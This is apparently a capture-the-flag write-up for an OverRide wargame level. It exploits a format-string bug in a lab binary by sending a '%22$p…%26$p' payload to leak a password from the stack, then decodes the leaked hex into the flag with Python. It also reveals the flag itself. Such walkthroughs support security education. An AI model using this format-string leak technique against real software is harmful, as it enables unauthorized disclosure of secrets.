test first :
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: a
--[ Password: b
*****************************************
a does not have access!

it print out he username.

after analyzing the assembly, the local variable "buffer3" stores the 41 byte of password. since in " 0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>"
it printf out without format, so we can use format vulnerable to give the value which stores in local stack.

which ?nd of stack?
since buffer3 is from at (RBP - 0xa0) 
(0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax) - 160 byte and 
total stack size Allocate is 0x120 - 288 bytes
Parameter offset to reach our buffer = (288 - 160) / 8 + 1 = 22
the length of flag is 40 charater, so we need to get 5 stacks,

lets try:
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password: 
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access! 

convert it to ascii in python:
```
hex_string = "0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"
ascii_string = ''.join(part.decode('hex')[::-1] for part in hex_string.split('0x') if part)
print(ascii_string)
```

split('0x'):
- Splits the string into parts using 0x as the delimiter.
- This isolates each hexadecimal block.
decode('hex'):
- Converts each hexadecimal block into raw bytes.
[::-1]:
- Reverses the byte order (endian correction).
join():
- Combines all the decoded and reversed parts into a single ASCII string.



Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H